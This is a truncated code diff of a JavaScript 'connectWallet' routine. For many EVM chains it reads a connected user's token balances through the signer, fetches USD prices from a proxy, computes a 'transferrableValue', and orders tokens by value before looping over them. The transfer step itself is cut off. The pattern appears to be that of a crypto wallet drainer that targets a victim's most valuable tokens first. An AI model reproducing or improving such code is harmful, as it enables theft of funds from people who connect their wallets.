                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  mantaTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    mantaTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          mantaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          mantaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
               
                           try {
                               for(let token of mantaTokenDetails){
@@ -1569,18 +1830,37 @@ async function connectWallet() {
                           for (let token of fantomTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  fantomTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    fantomTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          fantomTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          fantomTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of fantomTokenDetails){
@@ -1646,18 +1926,37 @@ async function connectWallet() {
                           for (let token of gnosisTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  gnosisTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    gnosisTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          gnosisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          gnosisTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of gnosisTokenDetails){
@@ -1723,18 +2022,37 @@ async function connectWallet() {
                           for (let token of lineaTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  lineaTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    lineaTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          lineaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          lineaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of lineaTokenDetails){
@@ -1801,18 +2119,37 @@ async function connectWallet() {
                           for (let token of celoTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  celoTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    celoTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          celoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          celoTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of celoTokenDetails){
@@ -1879,18 +2216,37 @@ async function connectWallet() {
                           for (let token of avaTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  avaTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    avaTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          avaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          avaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of avaTokenDetails){
@@ -1956,18 +2312,37 @@ async function connectWallet() {
                           for (let token of opbnbTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  opbnbTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    opbnbTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          opbnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          opbnbTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of opbnbTokenDetails){
@@ -2033,18 +2408,37 @@ async function connectWallet() {
                           for (let token of okxTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  okxTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    okxTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          okxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          okxTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of okxTokenDetails){
@@ -2111,18 +2505,37 @@ async function connectWallet() {
                           for (let token of mantleTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  mantleTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    mantleTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          mantleTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          mantleTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of mantleTokenDetails){
@@ -2188,18 +2601,37 @@ async function connectWallet() {
                           for (let token of aurTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  aurTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    aurTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          aurTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          aurTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of aurTokenDetails){
@@ -2266,18 +2698,37 @@ async function connectWallet() {
                           for (let token of cronosTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  cronosTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    cronosTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          cronosTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          cronosTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of cronosTokenDetails){
@@ -2342,18 +2793,37 @@ async function connectWallet() {
                           for (let token of klaytnTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  klaytnTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    klaytnTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          klaytnTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          klaytnTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of klaytnTokenDetails){
@@ -2420,18 +2890,37 @@ async function connectWallet() {
                           for (let token of platTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  platTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    platTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          platTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          platTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of platTokenDetails){
@@ -2498,18 +2987,37 @@ async function connectWallet() {
                           for (let token of harTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  harTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    harTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          harTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          harTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of harTokenDetails){
@@ -2576,18 +3084,37 @@ async function connectWallet() {
                           for (let token of hecoTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  hecoTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    hecoTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          hecoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          hecoTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of hecoTokenDetails){
@@ -2654,18 +3181,37 @@ async function connectWallet() {
                           for (let token of bchTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  bchTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
+                                if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                                    bchTokenDetails.push({
+                                        contract: tokenContract,
+                                        balance: balance,
+                                        symbol: token.tokenSymbol,
+                                        address: token.contractAddress,
+                                        usdValue: usdValue
+                                    });
+                                }
+                              }else{
+                                console.log('price info not available...')
                               }
                           }
               
                           // Sort tokens by balance, descending
-                          bchTokenDetails.sort((a, b) => b.balance.sub(a.balance));
+                          bchTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+              
               
                           try {
                               for(let token of bchTokenDetails){
@@ -2732,18 +3278,37 @@ async function connectWallet() {
                           for (let token of confluxTokens) {
                               const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                               const balance = await tokenContract.balanceOf(address);
-                              if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
-                                  confluxTokenDetails.push({
-                                      contract: tokenContract,
-                                      balance: balance,
-                                      symbol: token.tokenSymbol,
-                                      address: token.contractAddress
-                                  });
+                              const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                              const response = await fetch(proxyUrl)
+                              const prices = await response.json()
+                              const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                              console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                              if(priceInfo !== undefined){
+                                const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                                const usdValue = parseFloat(formattedBalance) * priceInfo
+                                const usdValueRounded = Math.round(usdValue)
+                                //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                                const usdValueString = usdValueRounded.toString()
+                                //console.log(usdValueString)
+                                const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+    
